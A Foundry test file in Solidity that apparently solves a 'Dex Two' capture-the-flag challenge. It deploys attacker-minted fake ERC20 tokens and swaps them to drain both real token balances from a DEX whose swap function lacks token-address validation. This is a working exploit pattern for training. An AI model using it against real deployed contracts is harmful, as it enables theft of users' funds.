// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DexTwo} from "../src/DexTwo.sol";
import {SwappableTokenTwo} from "../src/DexTwo.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract CounterTest is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    address attacker = makeAddr("attacker");

    // setup according to the question statement
    function setUp() public {
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(
            address(dex),
            "token1",
            "TKN1",
            10 ** 18
        );
        token2 = new SwappableTokenTwo(
            address(dex),
            "token2",
            "TKN2",
            10 ** 18
        );
        dex.setTokens(address(token1), address(token2));
        token1.approve(address(this), address(dex), 100);
        token2.approve(address(this), address(dex), 100);
        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);
        assertTrue(dex.balanceOf(address(token1), address(dex)) == 100);
        assertTrue(dex.balanceOf(address(token2), address(dex)) == 100);
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        assertTrue(token1.balanceOf(attacker) == 10);
        assertTrue(token2.balanceOf(attacker) == 10);
    }

    /*
there is no check for token address in swap function of dex contract 
*/

    function test_DrainDex() public {
        vm.startPrank(attacker);

        AttackingToken attackingToken1 = new AttackingToken(
            "Attack1",
            "SYMBOL1"
        );
        AttackingToken attackingToken2 = new AttackingToken(
            "Attack2",
            "SYMBOL2"
        );

        IERC20(attackingToken1).transfer(address(dex), 1);
        IERC20(attackingToken2).transfer(address(dex), 1);

        IERC20(attackingToken1).approve(address(dex), 1);
        IERC20(attackingToken2).approve(address(dex), 1);

        dex.swap(address(attackingToken1), address(token2), 1);
        dex.swap(address(attackingToken2), address(token1), 1);
        assertTrue(IERC20(token1).balanceOf(address(dex)) == 0);
        assertTrue(IERC20(token2).balanceOf(address(dex)) == 0);

        vm.stopPrank();
    }
}

contract AttackingToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 10 ** 18);
    }
}
